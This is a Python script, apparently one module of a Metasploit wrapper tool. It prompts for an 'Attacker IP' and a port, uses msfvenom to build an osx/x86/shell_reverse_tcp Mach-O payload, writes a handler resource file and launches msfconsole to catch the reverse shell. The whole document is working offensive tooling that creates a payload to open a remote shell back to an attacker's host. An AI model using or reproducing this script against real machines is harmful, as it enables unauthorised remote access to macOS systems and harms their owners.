#CREADO POR GEERXOS GITHUB: https://github.com/GeerxOS

import os

banner="""

 /'\_/`\          /'___\ 
/\      \    ____/\ \__/ 
\ \ \__\ \  /',__\ \ ,__|
 \ \ \_/\ \/\__, `\ \ \_/                 
  \ \_\\ \_\/\____/\ \_\ 
   \/_/ \/_/\/___/  \/_/ 

/\  _`\ /\ \            /\_ \  /\_ \     
\ \,\L\_\ \ \___      __\//\ \ \//\ \    
 \/_\__ \\ \  _ `\  /'__`\\ \ \  \ \ \   
   /\ \L\ \ \ \ \ \/\  __/ \_\ \_ \_\ \_ 
   \ `\____\ \_\ \_\ \____\/\____\/\____|
    \/_____/\/_/\/_/\/____/\/____/\/____/

"""

def osx86_net():
    os.system("clear")
    print(banner)
    print("Using: osx/x86/shell_reverse_tcp")
    ip = input("Attacker IP: ")
    port = input("Listen Port: ")
    name = input("Name for the file: ")
    print("Ok!")
    print("+---------------------------------------------------")
    print("+-> Payload data")
    print("+-> Payload: osx/x86/shell_reverse_tcp")
    print("+-> Attacker IP: "+ip+"")
    print("+-> Listen Port: "+port+"")
    print("+-> Name: "+name+"")
    print("+--------------------------------------------+ ")
    print("Creating payload [01]")
    os.system("msfvenom -p osx/x86/shell_reverse_tcp LHOST="+ip+" LPORT="+port+" -f macho >> "+name+".macho")
    print("Payload created! [01]")
    print("Saved in "+name+".macho")
    print("Running metasploit-framework...")
    os.system("touch osx86_net.rb")
    file = open("osx86_net.rb", "w")
    file.write(f'''
use exploit/multi/handler
set payload osx/x86/shell_reverse_tcp
set lhost = {ip}
set lport = {port}
exploit''')
    file.close
    os.system("gnome-terminal -- msfconsole -r osx86_net.rb &")
    input("Enter to return to the menu! ")
    os.system("clear")